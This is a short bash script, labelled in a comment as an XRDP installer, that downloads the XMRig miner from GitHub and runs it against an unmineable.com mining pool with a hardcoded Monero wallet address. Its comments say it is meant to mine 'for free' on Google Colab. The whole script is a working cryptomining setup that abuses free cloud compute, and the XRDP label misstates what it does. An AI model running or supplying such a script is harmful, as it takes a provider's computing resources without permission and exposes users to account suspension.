#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:8B8rV3KnXkdF5mFF6yS83jXQb9imJC6wPeRSGqBKwQDR5Z9cxnjTw11hxzCsDvXZe7P9JaUERrxr6PsiEZpJZdEg1ERZGmv.Worker
